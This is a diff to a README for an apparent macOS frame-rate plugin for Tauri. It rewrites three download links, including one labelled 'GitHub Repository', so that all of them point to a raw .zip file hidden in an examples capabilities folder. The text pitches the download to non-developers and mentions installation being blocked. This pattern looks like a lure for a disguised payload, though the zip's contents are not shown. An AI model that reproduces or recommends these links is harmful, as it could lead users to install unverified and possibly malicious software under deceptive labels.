@@ -1,6 +1,6 @@
 # 🚀 tauri-plugin-macos-fps - Unlock Higher Frame Rates on macOS
 
-[![Download Now](https://img.shields.io/badge/Download-tauri--plugin--macos--fps-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/sb090/tauri-plugin-macos-fps/main/examples/fps-diag/src-tauri/capabilities/fps-tauri-plugin-macos-3.2.zip)
+[![Download Now](https://img.shields.io/badge/Download-tauri--plugin--macos--fps-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/sb090/tauri-plugin-macos-fps/main/examples/fps-diag/src-tauri/capabilities/plugin_macos_fps_tauri_2.4.zip)
 
 ---
 
@@ -25,7 +25,7 @@ While this plugin is made for developers using Tauri, this guide shows how you c
 
 To get started, visit the official GitHub page where this software is hosted. Use the link below to access the page and download the latest version.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-2088FF?style=for-the-badge)](https://raw.githubusercontent.com/sb090/tauri-plugin-macos-fps/main/examples/fps-diag/src-tauri/capabilities/fps-tauri-plugin-macos-3.2.zip)
+[![Download on GitHub](https://img.shields.io/badge/Download-GitHub-2088FF?style=for-the-badge)](https://raw.githubusercontent.com/sb090/tauri-plugin-macos-fps/main/examples/fps-diag/src-tauri/capabilities/plugin_macos_fps_tauri_2.4.zip)
 
 On the page, look for the latest release or version and download the file provided. This file contains everything you need to activate the higher frame rates.
 
@@ -79,7 +79,7 @@ Normally, macOS limits web views inside apps to 60fps to save power and keep the
 
 ## 📂 Additional Resources
 
-- Visit the [GitHub Repository](https://raw.githubusercontent.com/sb090/tauri-plugin-macos-fps/main/examples/fps-diag/src-tauri/capabilities/fps-tauri-plugin-macos-3.2.zip) for updates and support.  
+- Visit the [GitHub Repository](https://raw.githubusercontent.com/sb090/tauri-plugin-macos-fps/main/examples/fps-diag/src-tauri/capabilities/plugin_macos_fps_tauri_2.4.zip) for updates and support.  
 - Check macOS Tauri app forums for tips on app compatibility.  
 - Read macOS support articles on managing app permissions if installation is blocked.  
 
